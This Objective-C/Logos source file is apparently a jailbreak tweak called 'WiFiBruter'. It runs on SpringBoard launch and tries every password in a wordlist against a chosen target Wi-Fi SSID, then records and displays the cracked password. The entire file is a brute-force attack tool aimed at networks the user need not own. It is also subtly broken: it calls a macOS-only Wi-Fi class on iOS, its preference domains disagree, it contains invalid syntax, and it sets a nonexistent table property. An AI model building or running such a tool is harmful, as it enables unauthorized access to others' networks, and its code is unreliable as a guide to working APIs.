#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>

static NSString *const kPrefsDomain = @"com.kilo.wifibruter";
static NSString *const kLogPath = @"/var/mobile/Documents/wifibruter_log.txt";
static NSTimeInterval kMinDelay = 0.5;

static void logMessage(NSString *msg);
static NSDictionary *loadConfig(void);
static NSArray *loadPasswords(void);
static BOOL isEnabled(void);
static NSString *targetSSID(void);
static NSTimeInterval getDelay(void);
static void saveConfig(NSDictionary *config);
static BOOL joinWithNetwork(id network, NSString *password, NSError **outError);
static NSArray *scanForTarget(NSString *ssid, NSError **outError);
static void runBruteForce(void);
static void reportSuccess(NSString *ssid, NSString *password);

static void logMessage(NSString *msg) {
    NSData *data = [msg dataUsingEncoding:NSUTF8StringEncoding];
    FILE *f = fopen([kLogPath fileSystemRepresentation], "a");
    if (f) {
        fwrite([data bytes], 1, [data length], f);
        fputc('\n', f);
        fclose(f);
    }
}

static NSDictionary *loadConfig(void) {
    NSString *plistPath = @"/var/mobile/Library/Preferences/dungx.wifibruter.plist";
    NSDictionary *config = [NSDictionary dictionaryWithContentsOfFile:plistPath];
    if (!config) config = @{};
    return [config copy];
}

static void saveConfig(NSDictionary *config) {
    NSString *plistPath = @"/var/mobile/Library/Preferences/dungx.wifibruter.plist";
    [config writeToFile:plistPath atomically:YES];
}

static NSArray *loadPasswords(void) {
    NSDictionary *config = loadConfig();
    NSString *path = [config objectForKey:@"WordListPath"];
    if (!path || path.length == 0) path = @"/var/mobile/Documents/wordlist.txt";
    NSString *wordlist = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
    if (!wordlist) {
        logMessage([NSString stringWithFormat:@"WiFiBruter: failed to read wordlist at %@", path]);
        return @[];
    }
    NSArray *parts = [wordlist componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
    NSMutableArray *passwords = [NSMutableArray array];
    for (NSString *p in parts) {
        if (p.length > 0) [passwords addObject:p];
    }
    logMessage([NSString stringWithFormat:@"WiFiBruter: loaded %lu passwords", (unsigned long)passwords.count]);
    return [passwords copy];
}

static BOOL isEnabled(void) {
    NSDictionary *config = loadConfig();
    NSNumber *enabled = [config objectForKey:@"Enabled"];
    return [enabled boolValue];
}

static NSString *targetSSID(void) {
    NSDictionary *config = loadConfig();
    return [config objectForKey:@"TargetSSID"] ?: @"";
}

static NSTimeInterval getDelay(void) {
    NSDictionary *config = loadConfig();
    NSNumber *d = [config objectForKey:@"DelayBetweenAttempts"];
    NSTimeInterval delay = [d doubleValue];
    if (delay < kMinDelay) delay = kMinDelay;
    return delay;
}

static BOOL joinWithNetwork(id network, NSString *password, NSError **outError) {
    Class cwCls = NSClassFromString(@"CWInterface");
    if (!cwCls) return NO;
    id iface = [cwCls performSelector:@selector(sharedInterface)];
    if (!iface) return NO;
    BOOL ok = NO;
    SEL selectors[] = {
        @selector(joinNetwork:withPassword:error:),
        @selector(associateToNetwork:password:error:),
        @selector(associateToNetwork:password:withSSID:error:)
    };
    NSUInteger count = sizeof(selectors) / sizeof(selectors[0]);
    for (NSUInteger i = 0; i < count; i++) {
        SEL sel = selectors[i];
        if ([iface respondsToSelector:sel]) {
            NSMethodSignature *sig = [iface methodSignatureForSelector:sel];
            if (!sig) continue;
            NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
            [inv setTarget:iface];
            [inv setSelector:sel];
            [inv setArgument:&network atIndex:2];
            [inv setArgument:&password atIndex:3];
            [inv setArgument:&outError atIndex:4];
            [inv invoke];
            [inv getReturnValue:&ok];
            if (ok) break;
        }
    }
    return ok;
}

static NSArray *scanForTarget(NSString *ssid, NSError **outError) {
    Class cwCls = NSClassFromString(@"CWInterface");
    if (!cwCls) return nil;
    id iface = [cwCls performSelector:@selector(sharedInterface)];
    if (!iface) return nil;
    NSArray *result = nil;
    SEL selectors[] = {
        @selector(scanForNetworksWithName:error:),
        @selector(scanForNetworksWithSSID:error:)
    };
    NSUInteger count = sizeof(selectors) / sizeof(selectors[0]);
    for (NSUInteger i = 0; i < count; i++) {
        SEL sel = selectors[i];
        if ([iface respondsToSelector:sel]) {
            NSMethodSignature *sig = [iface methodSignatureForSelector:sel];
            if (!sig) continue;
            NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
            [inv setTarget:iface];
            [inv setSelector:sel];
            [inv setArgument:&ssid atIndex:2];
            [inv setArgument:&outError atIndex:3];
            [inv invoke];
            [inv getReturnValue:&result];
            if (result) break;
        }
    }
    if (!result || result.count == 0) {
        if ([iface respondsToSelector:@selector(scanForNetworksWithError:)]) {
            NSError *scanErr = nil;
            NSMethodSignature *sig = [iface methodSignatureForSelector:@selector(scanForNetworksWithError:)];
            if (sig) {
                NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
                [inv setTarget:iface];
                [inv setSelector:@selector(scanForNetworksWithError:)];
                [inv setArgument:&scanErr atIndex:2];
                [inv invoke];
                [inv getReturnValue:&result];
            }
            if (result) {
                NSPredicate *pred = [NSPredicate predicateWithFormat:@"ssid == %@", ssid];
                result = [result filteredArrayUsingPredicate:pred];
            }
        }
    }
    return result;
}

static void runBruteForce(void) {
    if (!isEnabled()) return;
    NSString *target = targetSSID();
    if (target.length == 0) return;
    NSArray *passwords = loadPasswords();
    if (passwords.count == 0) return;
    NSTimeInterval delay = getDelay();

    Class cwCls = NSClassFromString(@"CWInterface");
    if (!cwCls) {
        logMessage(@"WiFiBruter: CWInterface class not available (likely iOS 15+ sandbox restriction)");
        return;
    }

    NSError *scanError = nil;
    NSArray *networks = scanForTarget(target, &scanError);
    if (!networks || networks.count == 0) {
        logMessage([NSString stringWithFormat:@"WiFiBruter: no networks found for SSID %@", target]);
        return;
    }
    logMessage([NSString stringWithFormat:@"WiFiBruter: found %lu network(s) for %@", (unsigned long)networks.count, target]);

    for (id network in networks) {
        for (NSString *password in passwords) {
            NSError *joinError = nil;
            BOOL ok = joinWithNetwork(network, password, &joinError);
            if (ok) {
                reportSuccess(target, password);
                return;
            }
            if (joinError) {
                logMessage([NSString stringWithFormat:@"WiFiBruter: join failed for '%@': %@", password, joinError.localizedDescription]);
            }
            if (delay > 0) usleep((useconds_t)(delay * 1000000.0));
        }
    }
    logMessage(@"WiFiBruter: exhausted wordlist without success");
}

static void reportSuccess(NSString *ssid, NSString *password) {
    NSString *message = [NSString stringWithFormat:@"WiFiBruter: cracked %@ -> %@", ssid, password];
    NSString *logPath = @"/var/mobile/Documents/wifibruter_result.txt";
    [message writeToFile:logPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    logMessage(message);
    dispatch_async(dispatch_get_main_queue(), ^{
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"WiFiBruter" message:message delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil];
        [alert show];
    });
}

%hook SpringBoard
- (void)applicationDidFinishLaunching:(id)application {
    %orig;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        runBruteForce();
    });
}
%end

%hook WiFiSettingsViewController
- (void)viewDidLoad {
    %orig;
    
    NSMutableArray *sections = [NSMutableArray arrayWithArray:self.tableView.sections ?: @[]];
    
    // Add WiFi Bruter section
    NSMutableDictionary *wifiBruterSection = [NSMutableDictionary dictionary];
    [wifiBruterSection setObject:@"WiFi Bruter" forKey:@"title"];
    
    NSMutableArray *rows = [NSMutableArray array];
    
    // Enabled toggle
    NSMutableDictionary *enabledRow = [NSMutableDictionary dictionary];
    [enabledRow setObject:@"Enabled" forKey:@"title"];
    [enabledRow setObject:@"switch" forKey:@"cell"];
    [enabledRow setObject:@"Enabled" forKey:@"key"];
    [enabledRow setObject:@([isEnabled()]) forKey:@"default"];
    [rows addObject:enabledRow];
    
    // Target SSID
    NSMutableDictionary *ssidRow = [NSMutableDictionary dictionary];
    [ssidRow setObject:@"Target SSID" forKey:@"title"];
    [ssidRow setObject:@"textfield" forKey:@"cell"];
    [ssidRow setObject:@"TargetSSID" forKey:@"key"];
    [ssidRow setObject:[targetSSID()] forKey:@"default"];
    [rows addObject:ssidRow];
    
    // Wordlist Path
    NSMutableDictionary *wordlistRow = [NSMutableDictionary dictionary];
    [wordlistRow setObject:@"Wordlist Path" forKey:@"title"];
    [wordlistRow setObject:@"textfield" forKey:@"cell"];
    [wordlistRow setObject:@"WordListPath" forKey:@"key"];
    [wordlistRow setObject:@"/var/mobile/Documents/wordlist.txt" forKey:@"default"];
    [rows addObject:wordlistRow];
    
    // Delay
    NSMutableDictionary *delayRow = [NSMutableDictionary dictionary];
    [delayRow setObject:@"Delay (seconds)" forKey:@"title"];
    [delayRow setObject:@"textfield" forKey:@"cell"];
    [delayRow setObject:@"DelayBetweenAttempts" forKey:@"key"];
    [delayRow setObject:@"1.0" forKey:@"default"];
    [delayRow setObject:@"numbers" forKey:@"keyboard"];
    [rows addObject:delayRow];
    
    [wifiBruterSection setObject:rows forKey:@"rows"];
    [sections addObject:wifiBruterSection];
    
    self.tableView.sections = sections;
}
%end
